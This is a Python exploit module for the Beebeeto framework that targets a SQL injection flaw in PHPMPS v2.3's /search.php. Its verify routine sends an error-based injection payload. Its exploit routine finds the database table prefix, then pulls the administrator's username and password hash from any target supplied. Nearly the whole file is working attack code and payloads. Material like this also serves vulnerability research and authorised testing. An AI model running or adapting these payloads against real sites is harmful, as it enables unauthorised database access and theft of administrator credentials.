#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


import re
import urllib2
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0220',
            'name': 'PHPMPS v2.3 /search.php SQL注入漏洞 POC & Exploit',
            'author': '1024',
            'create_date': '2014-12-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPMPS',
            'vul_version': ['2.3'],
            'type': 'SQL Injection',
            'tag': ['PHPMPS漏洞', 'SQL注入漏洞', '/search.php', 'php'],
            'desc': '''
                    phpmps 在修复漏洞时误将修复代码注释，造成 SQL 注入漏洞，
                    可以获取管理员账号密码等。
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-078413'],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%2' \
                  '0COUNT(*),CONCAT(md5(1364124124),FLOOR(RAND(0)*2))x%20FROM%20INFO' \
                  'RMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '1be92ddcc609c5e29f6265e9ee18f4f1' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    @classmethod
    def exploit(cls ,args):
        match_table_pre = re.compile('AS num FROM ([\w\d]+)_cus_value WHERE 0')
        match_result = re.compile('Duplicate entry \'(.*):([\w\d]{32})1\'')
        # 1
        payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%2' \
                  '0COUNT(*),CONCAT(md5(1364124124),FLOOR(RAND(0)*2))x%20FROM%20INFO' \
                  'RMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        response = requests.get(verify_url).content
        table_pre = match_table_pre.findall(response)[0]
        # 2
        payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%20' \
                  'COUNT(*),CONCAT((select%20concat(username,0x3a,password)%20from%20' \
                  '{0}_admin%20limit%201),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCH' \
                  'EMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'.format(table_pre)
        response = requests.get(args['options']['target'] + payload).content
        username, password = match_result.findall(response)[0]
        if args['options']['verbose']:
            print '[*] Request URL: ' + args['options']['target'] + payload
        if username and password:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['username'] = username
            args['poc_ret']['password'] = password
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())